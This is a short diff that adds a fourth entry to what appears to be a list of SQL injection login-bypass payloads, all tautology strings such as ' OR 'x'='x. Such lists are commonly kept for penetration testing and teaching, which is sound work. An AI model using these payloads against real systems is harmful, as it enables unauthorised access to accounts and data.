@@ -3,3 +3,4 @@
 - Payload 1 : ' OR '1
 - Payload 2 : ' OR 1 -- -
 - Payload 3 : ' OR '' = '
+- Payload 4 : ' OR 'x'='x
